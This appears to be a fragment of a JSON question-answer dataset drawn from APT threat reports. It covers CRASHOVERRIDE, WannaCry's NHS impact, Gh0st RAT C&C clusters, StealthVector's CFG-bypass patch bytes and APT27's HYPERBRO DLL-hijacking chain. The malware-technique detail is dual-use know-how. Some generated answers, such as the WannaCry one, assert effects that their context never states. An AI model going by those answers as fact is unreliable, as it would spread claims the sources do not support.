    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Introduction to Electric Grid Operations\nAs with most ICS specific incidents, the most interesting components of the attack are in how the adversary has demonstrated they understand the physical industrial process. Whereas vulnerabilities, exploits, and infection vectors can drive discussions in intrusion analysis of IT security threats that is not the most important aspect of an ICS attack. To fully understand the CRASHOVERRIDE framework, its individual capabilities, and overall impact on ICS security it is important to understand certain fundamentals of electric grid operations.\nSimplistically, the electric grid can be categorized into three functions: generation of electricity at power plants, transmission from the power plants across typically long distances at high voltage, and then stepped down to lower voltage to distribution networks to power customers. Along these long transmission and distribution systems are substations to transform voltage levels, serve as switching stations and feeders, and fault protection.\nMany industries feed into the electric grid, and those differences require different systems and communications. As an example, while a power plant feeds energy into the electric grid there is no one-size-fits-all approach to power plants. There are power plants that cover different sources of fuel including coal-fired, nuclear generation, wind farm, solar farm, gas turbine power, hydroelectric and more. This means that the electric grid must be a robust, almost living creature, which moves and balances electricity across large regions. Electric grids use a special type of industrial control system called a supervisory control and data acquisition (SCADA) system to manage this process across large geographical areas. Transmission and distribution owners have their substations in their particular geographical footprint and control centers manage the cross-territory SCADA systems 24/7 by human operators. These control centers often regularly manage the continual demand and response of their customers, respond to faults, and plan and work with neighboring utilities.\nThis simplistic view of grid operations is similar around the world. There are often vendor and network protocol differences between countries but the electrical engineering, and the overall process is largely the same between nations. As an example, these systems use SCADA and leverage systems such as remote terminal units (RTUs) to control circuit breakers. As the breakers open and close, substations are energized or de-energized to balance power across the grid. Some network protocols such as IEC 104, a TCP-based protocol, and its serial protocol companion IEC 101, are often regional specific. Europe, some of Asian, and portions of the Middle East leverage these protocols to control RTUs from the SCADA human machine interfaces (HMIs).\nIn North America, the protocol of choice for this is the Distributed Network Protocol 3 (DNP3). The various protocols purposes are largely the same though: control physical equipment through RTUs, programmable logic controllers (PLCs), and other final control elements via HMIs as a part of the larger SCADA system. Some protocols have been adopted cross-country including IEC 61850 which is usually leveraged from an HMI to work with equipment such as digital relays and other types of intelligent electronic devices (IEDs). IEDs are purpose built microprocessor-based control devices and can often be found alongside power equipment such as circuit breakers. IEDs and RTUs operate in a master/slave capacity where the slave devices are polled and sent commands by master devices.\nSubstations manage the flow of power through transmission or distribution lines. Management of energizing and de-energizing of these lines ultimately control when and where the flow of power moves in and out of the substation. If you \"open\" a breaker you are removing the path where the electricity is flowing, or de-energizing it. If you \"close\" a breaker then you are energizing the line by closing the gap and allowing the power to \"flow.\" This concept is similar to anyone who has tripped (opened) a breaker in their house. Traditional \"IT\" or \"IT security\" staff may be confused on this terminology as it is opposite to how one would describe firewall rules where \"open\" means network traffic may flow and \"closed\" means network traffic is prohibited.\nThe grid is a well-designed system, and while damage can be done, it is vital to understand that in nations around the world the electric community has designed the system to be reliable and safe which has a natural byproduct of increased security. In the United States as an example, reliability is reinforced with regular training and events such as the North American grid's GridEx where grid operators train for events from hurricanes, to terrorist incidents, to cyber-attacks and how they will respond to such outages. There is constantly a balance that must be understood when referring to grid operations: yes, the systems are vulnerable and more must be done to understand complex and multi-stage attacks, but the grid is also in a great defensible position because of the work of so many over the years.\n\nHow does the CRASHOVERRIDE framework demonstrate the adversary's understanding of the physical industrial processes within the electric grid? Why is this understanding crucial for analyzing ICS attacks?",
    "output": "The CRASHOVERRIDE framework demonstrates the adversary's understanding of the physical industrial processes within the electric grid by targeting specific components and protocols used in grid operations. This includes understanding the roles of substations, remote terminal units (RTUs), and the communication protocols like IEC 104 and DNP3. This understanding is crucial for analyzing ICS attacks because it allows the adversary to manipulate the grid's operations effectively, such as opening or closing circuit breakers to control the flow of power. Unlike IT security threats, where vulnerabilities and exploits are key, the physical understanding of the industrial process is paramount in ICS attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: Trusts infected by WannaCry, and locked out of devices\nBarts Health NHS Trust\nBirmingham Community Healthcare NHS Foundation Trust\nBlackpool Teaching Hospitals\nNHS Foundation Trust\nBradford District Care NHS Foundation Trust\nBridgewater Community Healthcare NHS Foundation Trust\nCentral Manchester University Hospitals NHS Foundation Trust\nColchester Hospital University\nNHS Foundation Trust\nCumbria Partnership NHS Foundation Trust\nEast and North Hertfordshire NHS Trust\nEast Cheshire NHS Trust\nEast Lancashire Teaching Hospitals NHS Trust\nEssex Partnership University NHS Foundation Trust\nGeorge Eliot Hospital NHS Trust\nGreater Manchester Mental Health NHS Foundation Trust\nHampshire Hospitals NHS Foundation Trust\nHull and East Yorkshire Hospitals NHS Trust\nHumber NHS Foundation Trust\nJames Paget University Hospitals NHS Foundation Trust\nLancashire Care NHS Foundation Trust\nLancashire Teaching Hospital NHS Trust\nMid Essex Hospital Services NHS Trust\nNorfolk and Norwich University Hospital NHS Foundation Trust\nNorth Cumbria University Hospitals NHS Trust\nNorthern Lincolnshire and Goole NHS Foundation Trust\nNorthumbria Healthcare NHS Foundation Trust\nNottinghamshire Healthcare NHS Foundation Trust\nPlymouth Hospitals NHS Trust\nRoyal Berkshire Hospital NHS Foundation Trust\nSalford Royal NHS Foundation Trust\nShrewsbury and Telford Hospital NHS Trust\nSolent NHS Trust\nSouthport and Ormskirk Hospital NHS Trust\nThe Dudley Group NHS Foundation Trust\nUnited Lincolnshire Hospitals NHS Trust\nUniversity Hospitals of Morecambe Bay NHS Foundation Trust\nWrightington, Wigan and Leigh\nNHS Foundation Trust\nYork Teaching Hospitals NHS Foundation Trust\nSource: NHS England\nVery Small Headline: Trusts not infected by WannaCry but known to have experienced disruption\nAiredale NHS Foundation Trust\nAshford and St Peters Hospitals NHS Foundation Trust\nBarking, Havering and Redbridge University Hospitals NHS Trust\nBarnsley Hospital NHS Foundation Trust\nBedford Hospital NHS Trust\nBradford Teaching Hospitals NHS Foundation Trust\nBrighton and Sussex University Hospitals NHS Trust\nBuckinghamshire Healthcare NHS Foundation Trust\nCalderdale and Huddersfield NHS Foundation Trust\nCentral London Community Healthcare NHS Trust\nChelsea and Westminster Hospital NHS Foundation Trust\nDoncaster and Bassetlaw Hospitals\nNHS Foundation Trust\nDorset Healthcare NHS Foundation Trust\nEast Kent Hospitals University\nNHS Foundation Trust\nGreat Ormond Street Hospital NHS Foundation Trust\nGuy's and St Thomas' NHS Foundation Trust\nHarrogate and District NHS Foundation Trust\nKettering General Hospital NHS Foundation Trust\nKingston Hospital NHS Trust\nLeeds and York Partnership NHS Foundation Trust\nLeeds Community Healthcare NHS Trust\nLeeds Teaching Hospitals NHS Trust\nLeicestershire Partnership NHS Trust\nLincolnshire Community Health Services NHS Trust\nLincolnshire Partnership NHS Trust\nLondon North West Healthcare NHS Trust\nLuton and Dunstable NHS Trust\nMid Yorkshire Hospitals NHS Trust\nMoorfields Eye Hospital NHS Foundation Trust\nNorth West Ambulance Service NHS Trust\nNorthampton General Hospital NHS Trust\nNorthamptonshire Healthcare NHS Foundation Trust\nRotherham, Doncaster and South Humber NHS Foundation Trust\nSheffield Children's NHS Foundation Trust\nSheffield Health and Social Care\nNHS Foundation Trust\nSheffield Teaching Hospitals NHS Foundation Trust\nSouth West Yorkshire Partnership NHS Foundation Trust\nSouth Western Ambulance Service NHS Foundation Trust\nSussex Community NHS Foundation Trust\nThe Rotherham NHS Foundation Trust\nUniversity Hospitals of Leicester NHS Trust\nWest Hertfordshire Hospitals NHS Trust\nWest London Mental Health NHS Trust\nYorkshire Ambulance Service NHS Trust\nSource: NHS England\nThis report has been printed on Evolution Digital Satin and contains material sourced from responsibly managed and sustainable forests certified in accordance with the FSC (Forest Stewardship Council).\nThe wood pulp is totally recyclable and acid-free. Our printers also have full ISO 14001 environmental accreditation, which ensures that they have effective procedures in place to manage waste and practices that may affect the environment.\nDesign and Production by NAO External Relations\nDP Ref: 11594-001\n\u00a310.00\n\nQuestion: How did the WannaCry cyber attack impact the operations of the NHS trusts that were infected? What specific challenges did these trusts face due to being locked out of their devices?\n\nAnswer:",
    "output": "The WannaCry cyber attack significantly disrupted the operations of several NHS trusts by locking them out of their devices. This resulted in various challenges such as the inability to access patient records, delays in medical procedures, and disruptions in communication systems. The affected trusts had to resort to manual processes and alternative methods to maintain essential services, causing significant operational strain.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Cluster: PCRat\nThis cluster contains 25 samples, and is linked with the HEART cluster (see HEART), the 7hero cluster (see 7hero) as well as the main Gh0st cluster through the common C&C at tajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.\nPCRat samples have been documented used against Uyghur groups (11).\nIt is debatable how valid the PCRat connections are. There is apparently a commercially available modification of Gh0st rat called PCRat, which we have not yet seen copies of. If that kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.\nBig Headline: Cluster: World\nThe World cluster consists of seven samples.\nSamples in this cluster all give the impression that they use hardcoded IP addresses for their C&C communication. This is because the real C&C ip is not stored in the executable, but exists base64 encoded in a text file downloaded from a remote site. Thus these files are shown with two C&C connections.\nThis cluster does not seem linked with other clusters. However, there is a strong resemblance between these samples and some samples in the Wangz cluster (e.g. c577b5a8d07982a2c6c42a7352c0cef8).\nBig Headline: Conclusions\nThis study shows the presence of several logical links between different Ghost campaigns: Links between malware type (in this case illustrated by the network protocol magic tag), links in the C&C infrastructure and to some extent links in the registration information.\nDue to the necessary scope limitation, many other links had to remain unexamined. However, the present work shows that some of the most active and prolific malware campaigns share enough connections indicate that the same groups or individuals are involved.\nIn the cases where we have been able to say something about the entities responsible for the attacks, it seems apparent that the persons involved can be considered career criminals. These are people that have their hand in many different types of online crime, have been doing it for quite some time, and often target victims inside China itself.\nSmaller clusters are in many ways more interesting. They are often more difficult to track, as they obviously leave less clues as to who is behind the attack and what the purpose is. Clusters that have been involved in targeted attacks typically belong to these.\nBig Headline: References\n1. Wikipedia. GhostNet. Wikipedia. [Online] http://en.wikipedia.org/wiki/GhostNet.\n2. Clean-MX. wt1888.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=wt1888.com.\n3. Clean-MX. 81266966.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=81266966.com.\n4. beishan.info. [Online] http://bbs.beishan.info/thread-849-1-1.html.\n5. cyberpolice.cn. Nanchang Cyberpolice. [Online] http://www.nanchang.cyberpolice.cn/show_news.asp?ID=1160.\n6. Blasco, Jaime. Targeted attacks against Tibet organizations. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/.\n7. Villeneuve, Nart. The Significance of the \"Nitro\" Attacks. Trend Micro. [Online] http://blog.trendmicro.com/the-significance-of-the-nitro-attacks/.\n8. Command Five Pty Ltd. Command and Control in the Fifth Domain. [Online] http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf.\n9. University of Toronto. Recent Observations in Tibet-Related Information Operations: Advanced Social Engineering for the Distribution of LURK Malware. Citizen Lab. [Online] https://citizenlab.org/wp-content/uploads/2012/07/10-2012-recentobservationsintibet.pdf.\n10. Walton, Greg. Tibetan journalists targeted by Gh0stRAT in Protest pictures.rar. MalwareLab. [Online] https://malwarelab.zendesk.com/entries/21199507-tibetan-journalists-targeted-by-gh0strat-in-protest-pictures-rar.\n11. Blasco, Jaime. New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/.\n12. Giuliani, Gianluca og Sharf, Elad. Nepalese government websites compromised to serve Zegost RAT . Websense Security Labs Blog. [Online] http://community.websense.com/blogs/securitylabs/archive/2012/08/08/nepalese-government-websites-compromised-to-serve-zegost-backdoor.aspx.\n\nQ: What unique characteristics distinguish the World cluster within the Gh0st RAT campaigns, and how do these characteristics impact the analysis and detection of these threats?",
    "output": "A: The World cluster consists of seven samples that appear to use hardcoded IP addresses for their C&C communication. However, the real C&C IP is not stored in the executable but exists base64 encoded in a text file downloaded from a remote site, leading to two C&C connections being displayed. This cluster does not seem linked with other clusters but shares a strong resemblance with some samples in the Wangz cluster. The use of base64 encoding and remote text files for C&C IPs makes the analysis and detection of these threats more challenging, as the actual C&C IP is not immediately visible within the malware sample itself.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does StealthVector bypass Microsoft's Control Flow Guard (CFG), and what is the role of the LdrpHandleInvalidUserCallTarget API in this process?",
    "output": "StealthVector bypasses Microsoft's Control Flow Guard (CFG) by patching the LdrpHandleInvalidUserCallTarget API in ntdll.dll with '48 FF E0 CC 90 (jmp rax; int3; nop)'. CFG restricts indirect calls to unapproved addresses, making it difficult for malware to execute code on Windows operating systems. When CFG determines that the target address is invalid, it calls the LdrpHandleInvalidUserCallTarget API. By patching this API, StealthVector can sidestep attempts to verify its indirect call, allowing it to execute its shellcode using CreateThread without crashing the application. This technique enables StealthVector to bypass CFG's restrictions and execute its payload successfully.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT27 group leverage DLL-Hijacking in the installation process of the HYPERBRO malware? Explain the steps involved and how this technique helps in evading detection.",
    "output": "APT27 uses DLL-Hijacking to load a malicious DLL (vftrace.dll) through a legitimate executable (msmpeng.exe or vfhost.exe). This process involves the following steps: (1) The legitimate executable is initially run, which then loads the malicious DLL using the DLL-Hijacking method. (2) The malicious DLL decodes and loads the malware payload (thumb.dat). (3) The decoded payload contains shellcode and a compressed DLL, which is decompressed and loaded into memory by the shellcode. (4) This DLL checks the location from which HYPERBRO was started and whether it has administrative rights. If it has administrative rights, all HYPERBRO files are moved to '%ProgramFiles%\\\\Common Files\\\\windefenders\\\\' to mimic Windows Defender. If not, they are moved to '%ProgramData%\\\\windefenders\\\\'. (5) HYPERBRO restarts itself at the new location using Process Hollowing in svchost.exe and possibly creates a temporary service to execute with local system rights. This technique helps in evading detection by leveraging legitimate software and mimicking its behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Applying the evidence-based approach to cyber attacks: the challenge of attribution\nDetermining those responsible for cyber attacks, commonly known as the attribution problem, is a major challenge. The Internet was never built with security as a priority. The current version of the Internet's address assignment system, IP V4, provides a wealth of loopholes and methods by which a perpetrator can mask his or her real identity and location. Online identities and servers can be cleverly hidden. Packet flows and connections can be masked and redirected through multiple servers. A clever attacker can often hijack a machine belonging to an otherwise innocent organization and use it as a base for launching attacks.\nHand-in-hand with the problem of attribution is the difficulty of identifying motivating factors behind a cyber attack. Many perpetrators of Internet-based attacks and exploits are individuals whose motivation can vary from a simple profit motive through to fear of prosecution or strong emotional feelings, including religious belief and nationalism. Many cyber attacks and exploits which seem to benefit states may be the work of third-party actors operating under a variety of motivations. This makes it difficult to separate the motivation of the individual from the potential motives of the party on whose behalf the attacks have occurred, or a prospective client to which the perpetrator is trying to market his or her wares. In either case, the challenge of identifying perpetrators and understanding their motives gives state actors convenient plausible deniability and the ability to officially distance themselves from attacks.\nCyber campaigns can also take on a life of their own. Even though a state might 'seed' a particular campaign through tacit encouragement or the absence of sanctions or prosecutions, these campaigns are inherently chaotic and unpredictable in scope and outcome.20 Phenomena such as spontaneous 'cyber rioting' can surpass the initial purposes of the cyber campaign. Low barriers to entry to this sort of activity enable anyone with a computer and Internet connection to take part in a cyberattack.21 For the most part, governments appear to passively benefit from online manifestations of nationalistic and patriotic fervour, although outcomes are inherently unpredictable.22\nIn China, the authorities most likely perceive individual attackers and their online activities as convenient instruments of national power.23 A favourite target of Chinese hackers is Taiwanese computer systems, especially during times of Sino-Taiwanese tensions, such as elections and\nreferendums.24 In April 2001, following the death of a Chinese fighter pilot after a collision with an American spy plane near the Chinese island of Hainan, Chinese hackers began a sustained campaign to target American computer networks. No link was made with elements of the Chinese government.25\n20 http://www.yorku.ca/robarts/projects/canada-watch/obama/pdfs/Deibert.pdf\n21 http://worldanalysis.net/modules/news/article.php?storyid=343\n22 For instance, during the Russia-Georgia conflict in August 2008, tools were made available online for those who wished to participate in the ongoing 'cyber-war' against Georgian websites. http://blog.wired.com/defense/2008/10/government-and.html ; http://www.slate.com/id/2197514\n23 http://findarticles.com/p/articles/mi_m0PBZ/is_6_88/ai_n31140190 ; http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\nHowever, governments cannot always preserve direct control over such activities; groups can maintain their freelance and autonomous status and undertake their own cyber initiatives that may not always attain official sanction or serve state interests.26\nBig Headline: Targeting Tibet\nAccusations of Chinese cyber war being waged against the Tibetan community have been commonplace for the past several years. The Chinese government has been accused of orchestrating and encouraging such activity as part of a wider strategy to crack down on dissident groups and subversive activity.27 Earlier research has traced these attacks against Tibetan groups to IP addresses registered in the People's Republic of China. The attacks used malware hidden in legitimate-looking email messages, infecting unsuspecting users' computers and exploiting the data on it by sending it to control servers.28\nThe identity of the attackers has never been attributed in a conclusive manner to any specific group or individual.29 The motivation of those behind the attacks, despite conjecture, is also unproven.\nIn earlier studies, researchers focused on attacks specifically targeting the Tibetan community. But a wide variety of other victims of computer penetrations have reported infections similar to those used against Tibetan organizations, following a similar modus operandi and also reporting to control servers usually located in China. These additional targets include the Falun Gong30, the U.S. Government, and multinational corporations.31 While reports of these targeted attacks have circulated, the extent to which attackers successfully exploited the affected computers is unknown.\n24 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n25 http://news.bbc.co.uk/2/hi/americas/1305755.stm\n26 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n27 http://www.washingtonpost.com/wp-dyn/content/article/2008/03/21/AR2008032102605.html\n28 See, http://isc.sans.org/diary.html?storyid=4177 ; http://isc.sans.org/diary.html?storyid=4176 and http://archive.cert.uni-stuttgart. de/isn/2002/09/msg00086.html for background information on these attacks.\n29 Attribution for previous penetrations of Tibetan groups has never been publicly attributed and is not available from open sources. Classified studies may reveal a finer grained detail, as many of the attacks are relatively unsophisticated, and given proper assets, could be traced back to specific locations and presumably individuals.\n30 Research by Maarten Van Horenbeeck shows that similar attacks have targeted the Falun Gong. http://www.daemon.be/ maarten/Crouching_Powerpoint_Hidden_Trojan_24C3.pdf and http://isc.sans.org/presentations/SANSFIRE2008-Is_Troy_Burning_ Vanhorenbeeck.pdf\n31 See http://www.businessweek.com/print/magazine/content/08_16/b4080032218430.htm\n\nAnswer this question based on the above context: How does the GhostNet APT leverage the attribution problem to conduct cyber attacks, and what are the primary challenges in identifying the perpetrators and their motivations?",
    "output": "The GhostNet APT leverages the attribution problem by exploiting the inherent insecurity of the Internet's address assignment system, IP V4, which allows perpetrators to mask their real identities and locations. Attackers can hide online identities and servers, mask packet flows, and hijack innocent machines to launch attacks. The primary challenges in identifying perpetrators include the difficulty in tracing the origin of attacks due to these masking techniques. Additionally, understanding the motivations behind cyber attacks is complex because perpetrators can range from individuals driven by profit, fear of prosecution, or strong emotional feelings, to third-party actors with various motivations. This complexity makes it hard to distinguish between the motives of individuals and those of state actors, providing state actors with plausible deniability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: The initial lure\nThe figures below show some of the slides from the slideshow. All the contents in the slideshow are written in Traditional Chinese, which is typically used in provinces in Southern China such as Guangdong and Hong Kong, as well as Taiwan. Since the topic of the slideshow relates explicitly to Taiwanese and the submission was from Taiwan, we assess the attacker was likely targeting Taiwanese individuals.\nGiven the use of a malicious document as the initial lure, the delivery method in this campaign is almost certainly spear\u00adphishing.\n\nQuestion: Why did the ELISE APT group choose to use a malicious document written in Traditional Chinese as their initial lure, and how does this choice reflect their targeting strategy?\n\nAnswer:",
    "output": "The ELISE APT group chose to use a malicious document written in Traditional Chinese as their initial lure because the content of the slideshow explicitly related to Taiwanese individuals and the submission originated from Taiwan. Traditional Chinese is commonly used in regions such as Guangdong, Hong Kong, and Taiwan. By using this language, the attackers aimed to increase the likelihood that their targets would engage with the document, indicating a targeted approach towards Taiwanese individuals. This choice reflects a strategic decision to make the lure more convincing and relevant to the intended victims, thereby increasing the effectiveness of their spear-phishing campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Very Small Headline: 3.3 Hostilities in Eastern Ukraine (April 2014 \u2013 Present)\nFollowing the annexation of Crimea, the world's attention was quickly drawn to the onset of hostilities in eastern Ukraine. Protesters from the Russian speaking minority in the cities of Donetsk, Luhansk, and Kharkiv occupied government buildings and called for independence.33 Pro-Russian 'separatist groups' emerged. The Ukrainian authorities responded by starting an 'anti-terrorist operation'. On 17 April, the first violent deaths occurred in eastern Ukraine; in the Black Sea city of Odessa, 42 people died in clashes. On 11 May, Donetsk and Luhansk declared themselves to be independent republics.\nPetro Poroshenko was elected President of Ukraine on 25 May, but this poll could not be held in large parts of the conflict-ridden east. A cease-fire agreement,34 signed in Minsk on 5 September 2014, collapsed when fighting started again in January 2015. A second agreement signed in the capital of Belarus on 11 February, Minsk II, provided for a ceasefire, the withdrawal of heavy weapons from the front line, a release of prisoners of war, and constitutional reform in Ukraine.35 This second agreement has also been violated, although currently, in September 2015, the situation seems to have calmed down. NATO reported the active involvement of Russian troops in eastern Ukraine,36 but Russia has consistently denied involvement.\nCyber operations have continued throughout the conflict. In May 2014, cyber means were used in an attempt to disrupt the presidential elections, including an effort to falsify the outcome. CyberBerkut may have taken part and some analysts believe that Russia was behind it.37 In August 2014, hackers conducted a DDoS attack against Ukraine's election commission website, just prior to the parliamentary polls.38\nThere are numerous publicly-known examples of intelligence gathering through cyber means, all of which reportedly have a Russian connection. In the Summer of 2014, the Blackenergy spyware was used against Ukrainian government institutions.39 In August, the Snake malware was employed against the Ukrainian Prime Minister's Office, as well as a number of foreign embassies.40 In April 2015, Looking-lass reported on a Russian campaign to extract classified documents from Ukrainian military and law enforcement agencies in an effort to support pro-Russian military\noperations in Ukraine.41 ISight Partners reported that Russian Sandworm hackers used a 'zero-day' vulnerability to hack NATO and Ukraine in a cyber espionage campaign.42 The list of targets was not confined to Ukrainian sites. In January 2015, CyberBerkut claimed responsibility for a cyber attack on German Government sites, demanding that Germany end its support to the Ukrainian government.43\n33 'Ukraine crisis: Timeline', BBC News, accessed 1 August 2015, (<http://www.bbc.com/news/world-middle-east-26248275>)http://www.bbc.com/news/world-middle-east-26248275.\n34 Protocol on the results of consultations of the Trilateral Contact Group, Minsk, 5 September 2014, (<http://mfa.gov.ua/en/news-feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014>)http://mfa.gov.ua/en/news-(<http://mfa.gov.ua/en/news-feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014>)feeds/foreign-offices-news/27596-protocolon-the-results-of-consultations-of-the-trilateral-contact-group-minsk-05092014.\n35 'Ukraine ceasefire: New Minsk agreement key points', BBC News, 12 February 2015, (<http://www.bbc.com/news/world-europe-31436513>)http://www.bbc.com/news/world-eu-(<http://www.bbc.com/news/world-europe-31436513>)rope-31436513.\n36 See for example: 'NATO Commander: 'Conditions in Eastern Ukraine Have to Change'', OPB, 6 February 2015, http://www. opb.org/news/article/npr-nato-commander-conditions-in-eastern-ukraine-have-to-change/, and 'Nato urges Russia to stop fuelling Ukraine conflict', The Irish Times, 15 April 2015, http://www.irishtimes.com/news/world/europe/nato-urges-russia-to-stop-fuelling-ukraine-conflict-1.2176718.\n37 Mark Clayton. 'Ukraine election narrowly avoided 'wanton destruction' from hackers (+video)', The Christian Science Monitor, 17 June 2014, (<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruc-(<http://www.csmonitor.com/World/Passcode/2014/0617/Ukraine-election-narrowly-avoided-wanton-destruction-from-hackers-video>)tion-from-hackers-video.\n38 'Hackers attack Ukraine election website', Presstv, 25 October 2014, (<http://www.presstv.ir/detail/2014/10/25/383623/ukraines-election-website-hacked/>)http://www.presstv.ir/detail/2014/10/25/383623/ukrai-(<http://www.presstv.ir/detail/2014/10/25/383623/ukraines-election-website-hacked/>)nes-election-website-hacked/. See also: Vitaly Shevchenko, 'Ukraine conflict: Hackers take sides in virtual war', BBC News, 20 December 2014, http://www.bbc.com/news/world-europe-30453069.\n39 David Gilbert. 'BlackEnergy Cyber Attacks Against Ukrainian Government Linked to Russia', International Business Times, 26 September 2014, (<http://www.ibtimes.co.uk/blackenergy-cyber-attacks-against-ukrainian-governm)ent-linked-russia-1467401>)http://www.ibtimes.co.uk/blackenergy-cyber-attacks-against-ukrainian-governm)ent-linked-russia-1467401.\n40 Sam Jones. 'Russia-linked cyber attack on Ukraine PM's office', CNBC, 8 August 2014, (<http://www.cnbc.com/id/101905588>)http://www.cnbc.com/id/101905588.\nOn the pro-Ukraine side, the Ukrainian Cyber Troops reportedly claimed to have hacked into Russian interior ministry servers and CCTV cameras in separatist-controlled eastern Ukraine.44\nVery\nAnswer this question: What types of malware were employed against Ukrainian government institutions and other entities during the conflict, and how were they utilized for intelligence gathering?",
    "output": "Several types of malware were employed against Ukrainian government institutions and other entities for intelligence gathering. In the summer of 2014, the BlackEnergy spyware was used against Ukrainian government institutions. In August 2014, the Snake malware was employed against the Ukrainian Prime Minister's Office, as well as a number of foreign embassies. In April 2015, Lookingglass reported on a Russian campaign to extract classified documents from Ukrainian military and law enforcement agencies in an effort to support pro-Russian military operations in Ukraine. Additionally, iSight Partners reported that Russian Sandworm hackers used a 'zero-day' vulnerability to hack NATO and Ukraine in a cyber espionage campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: INSIGHTS\n\u0141 Attackers will conduct\t reconnaissance on their targets and\t consider all sorts of targeting options (both direct and\t indirect).\n\u0141 Attackers may\ttarget a company\t in order to use it as a 'launchpad' to\t gain access to\t other targets, as demonstrated\t by\tthe targeting of\t ESTsoft's ALZip\t update server.\n\u0141 Attackers can conduct\t selective targeting \u00adchoosing\t which\tcomputers download\t malicious content and\t which do\t not, as they appear to have done with\tthe ALZip\t update server.\n\u0141 Even though two computers may\tsubmit\t an identical request for a file (or webpage),\t they\t may\tnot get\t the same file (or webpage) back in response. This\tbehaviour reduces the likelihood\t of malware unintentionally\t going viral.\t Unfortunately\tit\t also\t hampers investigations by network defenders who may\tassess a file (or webpage) to be safe,\t when it is\t not\t safe to\t all users.\n\u0141 Attackers may\thack a computer for the sole purpose of\t using\t it as a 'waypoint' or as an intermediary\tlocation from\t where they can store and access their tools without suspicion from their targets.\t This \tappears to\t have been the case with\tthe use of the Cite Media Holding Group\t webserver and the Nonhyeong\t based waypoint, although it\t is possible they were initially\t hacked for another reason.\n\u0141 Attackers may\tuse the same registration information to\t register multiple domain names.\t Such\tappears to have been the case with the domains registered by 'Lee Cooper'.\n\u0141 Attackers may\t register domains containing words that\t are expected\t to\t make them\t appear less suspicious to\t targets.\t Such\tas with the use of\t 'nateon'and 'alyac' in the callback domains used\t by infected SK\t Communications computers.\n\u0141 Attackers may\tuse seemingly\tlegitimate registration information to\t register domain names.\t Such\tappears to have been the case with the registration of 'alyac.org' and 'trendmicros.net'.\n\u0141 Users should\t be wary\tof domains which\t appear to be legitimate but\t are not.\t Such\tas 'alyac.org' instead of\t 'alyac.com',\n'trendmicros.net' instead\t of\t 'trendmicro.com', 'nprotects.org' instead of\t 'nprotect.com' and 'bomuls.com' instead\t of 'bomul.com'.\n\u0141 Even though it is relatively\t easy\tto\t create new\t infrastructure,\t attackers sometimes reuse infrastructure.\t For example,\t the domains 'bbs.ezxsoft.com' and 'update.alyac.org' both previously\tpointed to\t IP address 202.30.244.240,\t and 'alyac.org',\t 'trendmicros.net', 'nprotect.org' and\t 'bomuls.com' all pointed to\t IP address 222.122.20.241.\n\u0141 The TTL of domains (in DNS records) controlled\t by attackers are often set\t to low values (such\tas 30 minutes) allowing\t the attackers to\t rapidly\tchange the command\t and\t control server pointed to\t by a callback domain. This\t facilitates relatively\t uninterrupted access to a target\t when command\t and\t control infrastructure becomes blocked or is\totherwise unavailable.\n\u0141 The use of\t legitimate domains for malicious purposes,\t familiar words\t in domain names and\t of non\u00admalicious IP\t addresses in DNS\t records \tfor malicious domains,\t can make detection of malicious activity\tmore difficult and\t cause network defenders to\t dismiss malicious activity\t(in network/system\t logs\t or Intrusion Detection System\t alerts, in particular) as legitimate.\n\u0141 Adding malicious IP\t addresses and domains to\t blacklists can help\t prevent\t malicious activity, \thowever, attackers can respond\t by\t merely\tusing\t alternate infrastructure and/or callback domains.\n\u0141 Domains and\t IP addresses may\thave legitimate purposes too\t and blacklisting\t them may\talso\t block legitimate business.\t Blacklists should\t be reviewed periodically\t to\t ensure they\t are not\t blocking\t legitimate business unnecessarily.\n\u0141 Whitelists are generally\tmuch\tmore effective than blacklists,\t however, even whitelists can allow malicious activity to occur to\t legitimate sites that have been compromised.\t For example, as a good\t security\t practice,\t most system\t administrators would\t have allowed\t access to\t the ALZip update server if they had\t ALZip\t software installed on their network.\t Similarly,\tif a whitelist were employed on the targeted network but users had a legitimate need to access the website of\t the Taiwanese publishing company,\tthe attacker would\t likely\tstill have been able to access their toolbox.\n\u0141 Users and\t network administrators need to continually\treassess who and\t what\t they trust\t on the Internet given that\t trust\t relationships can be,\t and increasingly\tare, exploited for malicious purposes.\n\nIn the SK Communications incident, how did the attackers leverage seemingly legitimate registration information and domain names to evade detection? What strategies can network defenders employ to counteract these tactics?",
